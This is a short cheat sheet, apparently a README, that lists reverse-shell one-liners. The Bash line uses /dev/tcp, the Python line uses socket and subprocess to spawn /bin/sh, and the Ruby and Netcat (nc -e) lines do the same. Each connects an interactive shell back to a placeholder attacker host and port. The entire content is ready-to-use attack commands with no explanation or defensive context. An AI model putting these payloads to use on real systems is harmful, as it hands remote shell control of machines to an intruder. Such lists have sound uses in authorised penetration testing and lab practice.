# CheetSheet Reverse Shell
I'ts most useful Reverse Shell CheetSheet

<h2>Bash</h2>

`bash -i >& /dev/tcp/[LocalHost]/[LocalPort] 0>&1`

<h2>Python</h2>

<p>This was tested under Linux / Python 2.7.</p>

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

<h2>Ruby</h2>

`ruby -rsocket -e'f=TCPSocket.open("[LocalHost]",[LocalPort]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

<h2>Netcat</h2>

`nc -e /bin/sh [LocalHost] [LocalPort]`
